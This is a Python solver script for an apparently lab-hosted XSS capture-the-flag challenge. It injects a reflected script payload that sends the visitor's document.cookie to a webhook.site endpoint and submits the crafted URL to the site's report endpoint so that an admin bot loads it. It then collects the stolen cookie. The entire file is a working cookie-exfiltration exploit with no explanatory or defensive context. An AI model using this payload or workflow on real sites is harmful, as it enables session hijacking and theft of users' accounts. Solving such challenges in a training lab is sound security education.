import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from utils import get_session, find_flag

import json
import time

BASE_URL = "https://xss-playground-1.quoccacorp.com"

class Solver:
    def __init__(self):
        self.session = get_session()
        self.webhooksite_uuid = self.get_webhooksite_uuid()
        self.webhooksite_url = f"https://webhook.site/{self.webhooksite_uuid}"
        self.webhooksite_requests_url = f"https://webhook.site/token/{self.webhooksite_uuid}/requests"

    def get_webhooksite_uuid(self):
        response = self.session.post("https://webhook.site/token")
        return response.json()["uuid"]

    def find_flag_webhooksite(self):
        time.sleep(2)
        response = self.session.get(self.webhooksite_requests_url)
        text = json.dumps(response.json(), indent=2)
        print(text)
        find_flag(text)

    def main(self):
        PAYLOAD = f'<script>document.location = "{self.webhooksite_url}/?q=" + document.cookie</script>'
        response = self.session.get(BASE_URL, params={"name": PAYLOAD})

        redirect_url = response.url
        self.session.post(f"{BASE_URL}/report", data={"url": redirect_url})

        self.find_flag_webhooksite()

if __name__ == "__main__":
    Solver().main()
